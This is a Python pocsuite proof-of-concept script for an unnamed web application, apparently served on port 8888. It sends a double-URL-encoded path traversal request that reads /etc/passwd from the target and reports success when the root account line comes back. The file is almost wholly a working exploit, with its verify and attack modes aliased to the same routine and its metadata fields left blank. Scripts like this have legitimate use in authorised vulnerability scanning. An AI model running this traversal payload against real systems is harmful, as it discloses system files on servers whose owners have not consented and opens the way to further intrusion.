#!/usr/bin/env python
# coding: utf-8
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
import urlparse
from pocsuite.api.request import req
from pocsuite.api.utils import randomStr


class TestPOC(POCBase):
    vulID = 'N/A'  # ssvid
    version = '1.0'
    author = ['co0ontty']
    vulDate = ''
    createDate = ''
    updateDate = ''
    references = ['']
    name = ''
    appPowerLink = ''
    appName = ''
    appVersion = ''
    vulType = ''
    desc = ''' 
    '''
    samples = ['']
    install_requires = ['']

    def _verify(self):
        result = {}
        base_url = self.url
        if (urlparse.urlparse(base_url).port) is None:
            base_url = base_url+":8888"
        payload = "{}/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development".format(self.url)
        req_result = req.get(payload).text
        print(req_result)
        if "root:/root:/bin/ash" in req_result:
            print(req_result)
            result['VerifyInfo'] = "success"
        return self.parse_output(result)

    _attack = _verify

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
